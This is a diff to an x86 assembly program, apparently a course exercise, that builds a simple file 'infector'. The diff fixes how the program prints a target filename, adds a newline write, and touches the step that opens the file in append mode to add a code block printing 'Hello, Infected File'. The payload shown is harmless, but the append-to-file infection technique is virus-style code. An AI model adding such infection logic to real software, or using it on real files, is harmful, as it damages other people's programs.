@@ -1,5 +1,6 @@
 section .data
 strlen_msg db "Hello, Infected File", 0x0A
+newline db 10 ; newline character
 
 section .text
 global system_call
@@ -62,12 +63,24 @@ system_call:
     sub    esp, 4
 
     ; Print the filename
-    mov    eax, 4          ; syscall: write
-    mov    ebx, 1          ; file descriptor: stdout
     mov    ecx, [ebp+8]    ; filename (argument to infector)
+    push   ecx
     call   strlen
+    add    esp, 4
     mov    edx,eax
+    mov    eax, 4
+    mov    ebx, 1          ; file descriptor: stdout
+    mov    ecx, [ebp+8]
     int    0x80
+
+    ; Write newline
+    mov eax, 4
+    push ebx              ; save ebx (argc)
+    mov ebx, 1            ; file descriptor 1 is stdout
+    lea ecx, [newline]    ; address of newline character
+    mov edx, 1            ; length of newline
+    int 0x80
+    pop ebx               ; restore ebx (argc)
 
     ; Open the file (append mode)
     mov    eax, 5          ; syscall: open
@@ -114,9 +127,3 @@ code_start:
     db "Hello, Infected File", 0x0A
 
 code_end:
-
-section .text
-code_size equ code_end - code_start
-
-
-    
